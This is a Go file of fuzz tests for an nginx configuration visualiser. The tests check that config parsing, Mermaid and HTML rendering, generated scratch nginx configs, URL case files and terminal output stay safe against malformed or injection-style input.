// slow fails a fuzz input that is merely slow: no input may cost seconds.
func slow(t *testing.T, start time.Time, what string) {
	if d := time.Since(start); d > 3*time.Second {
		t.Fatalf("%s took %v", what, d)
	}
}

// FuzzParse: arbitrary config text never panics or hangs the parser, never
// reads outside the config directory, never yields a message with control
// characters, and whatever parses survives serialize + parse unchanged.
func FuzzParse(f *testing.F) {
	addSeeds(f)
	root := fuzzRoot(f)
	f.Fuzz(func(t *testing.T, src []byte) {
		start := time.Now()
		var warns []string
		ds, err := parseBytes(src, root, &warns)
		slow(t, start, "parse")
		for _, w := range warns {
			if reUnsafeText.MatchString(w) || strings.Contains(w, "\n") {
				t.Fatalf("warning with control characters: %q", w)
			}
		}
		if err != nil {
			if reUnsafeText.MatchString(cleanMultiline(err.Error())) {
				t.Fatalf("error prints control characters: %q", err.Error())
			}
			return
		}
		if hasDirective(ds, "nginxviz_secret_marker") {
			t.Fatalf("a file outside the config directory was included by %q", src)
		}
		var sb strings.Builder
		serialize(&sb, ds, 0)
		var w2 []string
		ds2, err := parseBytes([]byte(sb.String()), root, &w2)
		if err != nil {
			t.Fatalf("serialized form does not parse: %v\ninput: %q\nserialized: %q", err, src, sb.String())
		}
		if !sameTree(ds, ds2) {
			t.Fatalf("round trip changed the tree\ninput: %q\nserialized: %q", src, sb.String())
		}
	})
}

func fuzzBundle(src []byte, root string) *Bundle {
	var warns []string
	ds, err := parseBytes(src, root, &warns)
	if err != nil {
		return nil
	}
	if warns == nil {
		warns = []string{}
	}
	return &Bundle{Title: "fuzz", Warnings: warns, Hops: []*Hop{
		{Name: "edge", File: "edge.conf", Addrs: []string{"edge"}, Tree: ds},
		{Name: "app", File: "app.conf", Addrs: []string{"app", "10.0.0.5:8080", "u"}, Tree: ds},
	}}
}

// FuzzMermaid: no config can break out of the diagram or the Markdown.
func FuzzMermaid(f *testing.F) {
	addSeeds(f)
	root := fuzzRoot(f)
	f.Fuzz(func(t *testing.T, src []byte) {
		b := fuzzBundle(src, root)
		if b == nil {
			return
		}
		b.Title = string(src[:min(len(src), 80)])
		start := time.Now()
		md := Mermaid(b)
		slow(t, start, "Mermaid")
		if p := mdProblem(md); p != "" {
			t.Fatalf("%s\ninput: %q", p, src)
		}
	})
}

// FuzzHTML: no config or title can add markup or script to the page.
func FuzzHTML(f *testing.F) {
	addSeeds(f)
	root := fuzzRoot(f)
	f.Fuzz(func(t *testing.T, src []byte) {
		b := fuzzBundle(src, root)
		if b == nil {
			return
		}
		b.Title = string(src[:min(len(src), 80)])
		b.Hops[0].Name = string(src[:min(len(src), 20)])
		html, err := renderHTML(b)
		if err != nil {
			t.Fatal(err)
		}
		if p := htmlProblem(html, b); p != "" {
			t.Fatalf("%s\ninput: %q", p, src)
		}
	})
}

// FuzzScratchConf: whatever the config says, the copy a real nginx would be
// asked to run holds only allow-listed directives, listens and connects only
// on 127.0.0.1, and writes only inside the scratch directory.
func FuzzScratchConf(f *testing.F) {
	addSeeds(f)
	root := fuzzRoot(f)
	f.Fuzz(func(t *testing.T, src []byte) {
		b := fuzzBundle(src, root)
		if b == nil {
			return
		}
		s := &scratch{b: b, dir: filepath.Join(root, "scratch"), stubs: map[string]int{}, notes: map[string]bool{}, allow: map[string]bool{},
			closed: 1, certFile: "/scratch/cert.pem", keyFile: "/scratch/key.pem"}
		s.newStub = func(string) (int, error) { return 50000 + len(s.stubs), nil }
		next := 40000
		if err := s.plan(func() (int, error) { next++; return next, nil }); err != nil {
			return
		}
		start := time.Now()
		for _, h := range s.hops {
			conf, err := s.buildConf(h)
			if err != nil {
				continue
			}
			if p := scratchProblem(s, h, conf); p != "" {
				t.Fatalf("%s\ninput: %q\nscratch config:\n%s", p, src, conf)
			}
		}
		slow(t, start, "building scratch configs")
		if n := s.droppedNote(); reUnsafeText.MatchString(strings.TrimSpace(n)) {
			t.Fatalf("dropped-directive note has control characters: %q", n)
		}
	})
}

// FuzzCases: the -verify URL file.
func FuzzCases(f *testing.F) {
	for _, s := range []string{
		"https://example.com/a?x=1\n", "POST http://example.com/b | User-Agent: Googlebot | Cookie: a=b\n",
		"# comment\n\nexample.com/c\n", "GET  http://[::1]:8080/ | Host: other\r\n", "a b c\n", " | x: y\n", "\x00\xff | : \n",
	} {
		f.Add([]byte(s))
	}
	if data, err := os.ReadFile("examples/urls.txt"); err == nil {
		f.Add(data)
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		cases, err := parseCases(data, "urls")
		if err != nil {
			if reUnsafeText.MatchString(cleanMultiline(err.Error())) {
				t.Fatalf("error prints control characters: %q", err.Error())
			}
			return
		}
		if len(cases) == 0 || len(cases) > maxCases {
			t.Fatalf("%d cases", len(cases))
		}
		var hosts []string
		for _, c := range cases {
			if c.Method == "" || !strings.Contains(c.URL, "://") || c.Headers == nil {
				t.Fatalf("malformed case %+v", *c)
			}
			for _, h := range c.Headers {
				if !strings.Contains(h, ":") {
					t.Fatalf("header without colon: %q", h)
				}
			}
			hosts = append(hosts, c.URL)
		}
		// Host names from the file go on the scratch certificate.
		for _, h := range hosts {
			if n, ok := certName(h); ok && (len(n) > 253 || bytes.ContainsAny([]byte(n), " \x00/\\\"")) {
				t.Fatalf("certName accepted %q", n)
			}
		}
	})
}

// FuzzClean: nothing printed to a terminal can carry a control sequence.
func FuzzClean(f *testing.F) {
	for _, s := range []string{"plain", "\x1b[31m", "a\nb", "\u202e", "\xff\xfe", "\u009b", strings.Repeat("é", 3000)} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		for _, got := range []string{clean(s), mdText(s), mdCode(s)} {
			if !utf8.ValidString(got) || reUnsafeText.MatchString(got) || strings.ContainsAny(got, "\n\t") {
				t.Fatalf("unsafe output %q from %q", got, s)
			}
		}
		if got := clean(s); len(got) > maxMessage+8 {
			t.Fatalf("clean returned %d bytes", len(got))
		}
		if strings.Contains(mdCode(s), "`") {
			t.Fatalf("mdCode left a backtick in %q", mdCode(s))
		}
		if got := cleanMultiline(s); !utf8.ValidString(got) || reUnsafeText.MatchString(got) {
			t.Fatalf("cleanMultiline unsafe: %q", got)
		}
		e := esc(s)
		if !utf8.ValidString(e) || strings.ContainsAny(e, "\"`\n") || strings.Contains(strings.ReplaceAll(e, "<br/>", ""), "<") {
			t.Fatalf("esc unsafe: %q", e)
		}
	})
}
